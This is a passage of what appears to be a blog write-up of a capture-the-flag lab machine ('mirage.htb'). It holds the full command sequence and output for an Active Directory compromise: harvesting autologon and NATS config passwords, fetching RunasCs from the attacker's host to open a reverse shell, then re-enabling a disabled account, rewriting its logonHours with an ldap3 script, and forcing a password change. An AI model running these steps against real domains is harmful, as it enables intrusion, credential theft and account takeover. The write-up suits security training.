../desktop/user.txt</span><br><span class="line">1d0d6aef2bfb146cca9f75ecd9498908</span><br><span class="line">*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>I used PowerUp.ps1 to check for autologon creds:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; Invoke-AllChecks</span><br><span class="line"></span><br><span class="line">[*] Running Invoke-AllChecks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Checking <span class="keyword">if</span> user is <span class="keyword">in</span> a <span class="built_in">local</span> group with administrative privileges...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Checking <span class="keyword">for</span> unquoted service paths...</span><br><span class="line">Access denied </span><br><span class="line">At C:\Users\nathan.aadam\Documents\p.ps1:1451 char:21</span><br><span class="line">+     <span class="variable">$VulnServices</span> = Get-WmiObject -Class win32_service | Where-Object ...</span><br><span class="line">+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException</span><br><span class="line">    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Checking service executable and argument permissions...</span><br><span class="line">Access denied </span><br><span class="line">At C:\Users\nathan.aadam\Documents\p.ps1:1504 char:5</span><br><span class="line">+     Get-WMIObject -Class win32_service | Where-Object &#123;<span class="variable">$_</span> -and <span class="variable">$_</span>.pat ...</span><br><span class="line">+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException</span><br><span class="line">    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Checking service permissions...</span><br><span class="line">Cannot open Service Control Manager on computer <span class="string">&#x27;.&#x27;</span>. This operation might require other privileges.</span><br><span class="line">At C:\Users\nathan.aadam\Documents\p.ps1:1555 char:5</span><br><span class="line">+     Get-Service | Test-ServiceDaclPermission -PermissionSet <span class="string">&#x27;ChangeCo ...</span></span><br><span class="line"><span class="string">+     ~~~~~~~~~~~</span></span><br><span class="line"><span class="string">    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException</span></span><br><span class="line"><span class="string">    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking %PATH% for potentially hijackable DLL locations...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ModifiablePath    : C:\Users\nathan.aadam\AppData\Local\Microsoft\WindowsApps</span></span><br><span class="line"><span class="string">IdentityReference : MIRAGE\nathan.aadam</span></span><br><span class="line"><span class="string">Permissions       : &#123;WriteOwner, Delete, WriteAttributes, Synchronize...&#125;</span></span><br><span class="line"><span class="string">%PATH%            : C:\Users\nathan.aadam\AppData\Local\Microsoft\WindowsApps</span></span><br><span class="line"><span class="string">AbuseFunction     : Write-HijackDll -DllPath &#x27;</span>C:\Users\nathan.aadam\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for AlwaysInstallElevated registry key...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for Autologon credentials in registry...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">DefaultDomainName    : MIRAGE</span></span><br><span class="line"><span class="string">DefaultUserName      : mark.bbond</span></span><br><span class="line"><span class="string">DefaultPassword      : 1day@atime</span></span><br><span class="line"><span class="string">AltDefaultDomainName :</span></span><br><span class="line"><span class="string">AltDefaultUserName   :</span></span><br><span class="line"><span class="string">AltDefaultPassword   :</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for modifidable registry autoruns and configs...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for modifiable schtask files/configs...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for unattended install files...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for encrypted web.config strings...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for encrypted application pool and virtual directory passwords...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for plaintext passwords in McAfee SiteList.xml files....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking for cached Group Policy Preferences .xml files....</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>mark.bbond:1day@atime</code></p>
+<p>We can also read the configuration file for nats:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\program files\nats-server&gt; <span class="built_in">cat</span> nats-server.conf</span><br><span class="line">listen: <span class="string">&#x27;0.0.0.0:4222&#x27;</span></span><br><span class="line"></span><br><span class="line">jetstream: &#123;</span><br><span class="line">  store_dir: <span class="string">&#x27;C:\Program Files\Nats-Server\tmp&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">accounts: &#123;</span><br><span class="line">  <span class="string">&#x27;$SYS&#x27;</span>: &#123;</span><br><span class="line">    <span class="built_in">users</span>: [</span><br><span class="line">      &#123; user: <span class="string">&#x27;sysadmin&#x27;</span>, password: <span class="string">&#x27;bb5M0k5XWIGD&#x27;</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;dev&#x27;</span>: &#123;</span><br><span class="line">    jetstream: <span class="literal">true</span>,</span><br><span class="line">    <span class="built_in">users</span>: [</span><br><span class="line">      &#123; user: <span class="string">&#x27;Dev_Account_A&#x27;</span>, password: <span class="string">&#x27;hx5h7F5554fP@1337!&#x27;</span> &#125;,</span><br><span class="line">      &#123; user: <span class="string">&#x27;Dev_Account_B&#x27;</span>, password: <span class="string">&#x27;tvPFGAzdsJfHzbRJ&#x27;</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\nathan.aadam\desktop&gt; reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultUsername</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    DefaultUsername    REG_SZ    mark.bbond</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nathan.aadam\desktop&gt; reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultPassword</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    DefaultPassword    REG_SZ    1day@atime</span><br></pre></td></tr></table></figure></div>
+
+<p>Now get a shell with runascs:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; iwr 10.10.16.3/RunasCs.exe -outfile r.exe</span><br><span class="line">*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; ./r.exe mark.bbond 1day@atime powershell.exe -r 10.10.16.3:4444</span><br><span class="line">[*] Warning: The logon <span class="keyword">for</span> user <span class="string">&#x27;mark.bbond&#x27;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="string">&#x27;8&#x27;</span> to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session 0 with process <span class="keyword">function</span> CreateProcessWithLogonW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-4345ab$\Default</span><br><span class="line">[+] Async process <span class="string">&#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27;</span> with pid 2256 created <span class="keyword">in</span> background.</span><br><span class="line">*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(base) ┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ rlwrap nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.3] from (UNKNOWN) [10.129.104.218] 63865</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Install the latest PowerShell <span class="keyword">for</span> new features and improvements! https://aka.ms/PSWindows</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">mirage\mark.bbond</span><br><span class="line">PS C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>He is a member of <code>IT_SUPPORT</code> who have <code>ForceChangePassword</code> on <code>JAVIER.MMARSHAL</code>.<br>The path is as follows:<br>ticket as mark.bbon -&gt; export it -&gt; remove accountdisable for javier -&gt; update logonHours with script -&gt; change javier password -&gt; use nxc to dump gmsa</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; Get-ADUser JAVIER.MMARSHALL -Property *</span><br><span class="line">Get-ADUser JAVIER.MMARSHALL -Property *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AccountExpirationDate                : </span><br><span class="line">accountExpires                       : 9223372036854775807</span><br><span class="line">AccountLockoutTime                   : </span><br><span class="line">AccountNotDelegated                  : False</span><br><span class="line">AllowReversiblePasswordEncryption    : False</span><br><span class="line">AuthenticationPolicy                 : &#123;&#125;</span><br><span class="line">AuthenticationPolicySilo             : &#123;&#125;</span><br><span class="line">BadLogonCount                        : 0</span><br><span class="line">badPasswordTime                      : 0</span><br><span class="line">badPwdCount                          : 0</span><br><span class="line">CannotChangePassword                 : True</span><br><span class="line">CanonicalName                        : mirage.htb/Disabled/Users/javier.mmarshall</span><br><span class="line">Certificates                         : &#123;&#125;</span><br><span class="line">City                                 : </span><br><span class="line">CN                                   : javier.mmarshall</span><br><span class="line">codePage                             : 0</span><br><span class="line">Company                              : </span><br><span class="line">CompoundIdentitySupported            : &#123;False&#125;</span><br><span class="line">Country                              : </span><br><span class="line">countryCode                          : 0</span><br><span class="line">Created                              : 5/2/2025 1:33:11 AM</span><br><span class="line">createTimeStamp                      : 5/2/2025 1:33:11 AM</span><br><span class="line">Deleted                              : </span><br><span class="line">Department                           : </span><br><span class="line">Description                          : Contoso Contractors</span><br><span class="line">DisplayName                          : javier.mmarshall</span><br><span class="line">DistinguishedName                    : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb</span><br><span class="line">Division                             : </span><br><span class="line">DoesNotRequirePreAuth                : False</span><br><span class="line">dSCorePropagationData                : &#123;5/22/2025 2:49:20 PM, 5/22/2025 2:45:45 PM, 5/22/2025 2:02:51 PM, 5/22/2025 </span><br><span class="line">                                       1:08:07 PM...&#125;</span><br><span class="line">EmailAddress                         : </span><br><span class="line">EmployeeID                           : </span><br><span class="line">EmployeeNumber                       : </span><br><span class="line">Enabled                              : False</span><br><span class="line">Fax                                  : </span><br><span class="line">GivenName                            : javier.mmarshall</span><br><span class="line">HomeDirectory                        : </span><br><span class="line">HomedirRequired                      : False</span><br><span class="line">HomeDrive                            : </span><br><span class="line">HomePage                             : </span><br><span class="line">HomePhone                            : </span><br><span class="line">Initials                             : </span><br><span class="line">instanceType                         : 4</span><br><span class="line">isDeleted                            : </span><br><span class="line">KerberosEncryptionType               : &#123;None&#125;</span><br><span class="line">LastBadPasswordAttempt               : </span><br><span class="line">LastKnownParent                      : </span><br><span class="line">lastLogoff                           : 0</span><br><span class="line">lastLogon                            : 133926722371201785</span><br><span class="line">LastLogonDate                        : 5/22/2025 2:45:29 PM</span><br><span class="line">lastLogonTimestamp                   : 133924239295082185</span><br><span class="line">LockedOut                            : False</span><br><span class="line">logonCount                           : 13</span><br><span class="line">logonHours                           : &#123;0, 0, 0, 0...&#125;</span><br><span class="line">LogonWorkstations                    : </span><br><span class="line">Manager                              : </span><br><span class="line">MemberOf                             : &#123;CN=IT_Contractors,OU=Groups,OU=Contractors,OU=IT_Staff,DC=mirage,DC=htb&#125;</span><br><span class="line">MNSLogonAccount                      : False</span><br><span class="line">MobilePhone                          : </span><br><span class="line">Modified                             : 5/25/2025 11:44:43 AM</span><br><span class="line">modifyTimeStamp                      : 5/25/2025 11:44:43 AM</span><br><span class="line">msDS-SupportedEncryptionTypes        : 0</span><br><span class="line">msDS-User-Account-Control-Computed   : 0</span><br><span class="line">Name                                 : javier.mmarshall</span><br><span class="line">nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity</span><br><span class="line">ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb</span><br><span class="line">ObjectClass                          : user</span><br><span class="line">ObjectGUID                           : c52e731b-30c1-439c-a6b9-0c2f804e5f08</span><br><span class="line">objectSid                            : S-1-5-21-2127163471-3824721834-2568365109-1108</span><br><span class="line">Office                               : </span><br><span class="line">OfficePhone                          : </span><br><span class="line">Organization                         : </span><br><span class="line">OtherName                            : </span><br><span class="line">PasswordExpired                      : False</span><br><span class="line">PasswordLastSet                      : 5/25/2025 11:44:43 AM</span><br><span class="line">PasswordNeverExpires                 : True</span><br><span class="line">PasswordNotRequired                  : False</span><br><span class="line">POBox                                : </span><br><span class="line">PostalCode                           : </span><br><span class="line">PrimaryGroup                         : CN=Domain Users,CN=Users,DC=mirage,DC=htb</span><br><span class="line">primaryGroupID                       : 513</span><br><span class="line">PrincipalsAllowedToDelegateToAccount : &#123;&#125;</span><br><span class="line">ProfilePath                          : </span><br><span class="line">ProtectedFromAccidentalDeletion      : False</span><br><span class="line">pwdLastSet                           : 133926722832178700</span><br><span class="line">SamAccountName                       : javier.mmarshall</span><br><span class="line">sAMAccountType                       : 805306368</span><br><span class="line">ScriptPath                           : </span><br><span class="line">sDRightsEffective                    : 0</span><br><span class="line">ServicePrincipalNames                : &#123;&#125;</span><br><span class="line">SID                                  : S-1-5-21-2127163471-3824721834-2568365109-1108</span><br><span class="line">SIDHistory                           : &#123;&#125;</span><br><span class="line">SmartcardLogonRequired               : False</span><br><span class="line">State                                : </span><br><span class="line">StreetAddress                        : </span><br><span class="line">Surname                              : </span><br><span class="line">Title                                : </span><br><span class="line">TrustedForDelegation                 : False</span><br><span class="line">TrustedToAuthForDelegation           : False</span><br><span class="line">UseDESKeyOnly                        : False</span><br><span class="line">userAccountControl                   : 66050</span><br><span class="line">userCertificate                      : &#123;&#125;</span><br><span class="line">UserPrincipalName                    : javier.mmarshall@mirage.htb</span><br><span class="line">uSNChanged                           : 69841</span><br><span class="line">uSNCreated                           : 24655</span><br><span class="line">whenChanged                          : 5/25/2025 11:44:43 AM</span><br><span class="line">whenCreated                          : 5/2/2025 1:33:11 AM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; </span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ getTGT.py mirage.htb/<span class="string">&#x27;mark.bbond&#x27;</span>:<span class="string">&#x27;1day@atime&#x27;</span> -dc-ip dc01.mirage.htb</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> mark.bbond.ccache</span><br><span class="line">                                                                                                        </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=mark.bbond.ccache   </span><br><span class="line">                                                                                                        </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ bloodyAD --host 10.129.104.218 -d mirage.htb -k --dc-ip dc01.mirage.htb remove uac  JAVIER.MMARSHALL -f ACCOUNTDISABLE</span><br><span class="line">[-] [<span class="string">&#x27;ACCOUNTDISABLE&#x27;</span>] property flags removed from JAVIER.MMARSHALL<span class="string">&#x27;s userAccountControl</span></span><br></pre></td></tr></table></figure></div>
+
+<p>even if you enable an account, <strong>login is still blocked outside the allowed time window</strong> defined in the <code>logonHours</code> attribute.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~/gMSADumper]</span><br><span class="line">└─$ bloodyAD --host 10.129.104.218 -d mirage.htb -k --dc-ip dc01.mirage.htb get object mark.bbond</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb</span><br><span class="line">accountExpires: 1601-01-01 00:00:00+00:00</span><br><span class="line">badPasswordTime: 1601-01-01 00:00:00+00:00</span><br><span class="line">badPwdCount: 0</span><br><span class="line">cn: mark.bbond</span><br><span class="line">codePage: 0</span><br><span class="line">countryCode: 0</span><br><span class="line">dSCorePropagationData: 2025-07-04 19:36:40+00:00</span><br><span class="line">displayName: mark.bbond</span><br><span class="line">givenName: mark.bbond</span><br><span class="line">instanceType: 4</span><br><span class="line">lastLogoff: 1601-01-01 00:00:00+00:00</span><br><span class="line">lastLogon: 2025-07-23 20:56:04.981028+00:00</span><br><span class="line">lastLogonTimestamp: 2025-07-23 17:50:03.460126+00:00</span><br><span class="line">logonCount: 71</span><br><span class="line">logonHours: ////////////////////////////</span><br></pre></td></tr></table></figure></div>
+
+<p>logonHours value should be <code>////////////////////////////</code></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">cat</span> update_javier.py </span><br><span class="line">from ldap3 import Server, Connection, SASL, GSSAPI, MODIFY_REPLACE</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&quot;KRB5CCNAME&quot;</span>] = <span class="string">&quot;./mark.bbond.ccache&quot;</span></span><br><span class="line"></span><br><span class="line">server = Server(<span class="string">&quot;dc01.mirage.htb&quot;</span>, get_info=None)</span><br><span class="line">conn = Connection(server, authentication=SASL, sasl_mechanism=GSSAPI)</span><br><span class="line">conn.bind()</span><br><span class="line"></span><br><span class="line">dn = <span class="string">&quot;CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb&quot;</span></span><br><span class="line">logon_hours_hex = <span class="string">&quot;FF&quot;</span> * 21</span><br><span class="line">logon_hours_bytes = bytes.fromhex(logon_hours_hex)</span><br><span class="line"></span><br><span class="line">conn.modify(dn, &#123;<span class="string">&quot;logonHours&quot;</span>: [(MODIFY_REPLACE, [logon_hours_bytes])]&#125;)</span><br><span class="line"><span class="built_in">print</span>(conn.result)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ bloodyAD --host 10.129.104.218 -d mirage.htb -k --dc-ip dc01.mirage.htb get object JAVIER.MMARSHALL</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb</span><br><span class="line">accountExpires: 9999-12-31 23:59:59.999999+00:00</span><br><span class="line">badPasswordTime: 1601-01-01 00:00:00+00:00</span><br><span class="line">badPwdCount: 0</span><br><span class="line">cn: javier.mmarshall</span><br><span class="line">codePage: 0</span><br><span class="line">countryCode: 0</span><br><span class="line">dSCorePropagationData: 2025-05-22 21:49:20+00:00</span><br><span class="line">description: Contoso Contractors</span><br><span class="line">displayName: javier.mmarshall</span><br><span class="line">givenName: javier.mmarshall</span><br><span class="line">instanceType: 4</span><br><span class="line">lastLogoff: 1601-01-01 00:00:00+00:00</span><br><span class="line">lastLogon: 2025-07-23 20:56:28.711298+00:00</span><br><span class="line">lastLogonTimestamp: 2025-07-23 20:52:44.575126+00:00</span><br><span class="line">logonCount: 25</span><br><span class="line">logonHours: ////////////////////////////</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ bloodyAD --host 10.129.104.218 -d mirage.htb -k --dc-ip dc01.mirage.htb <span class="built_in">set</span> password  JAVIER.MMARSHALL <span class="string">&quot;kujenPassword123&quot;</span></span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure></div>
+
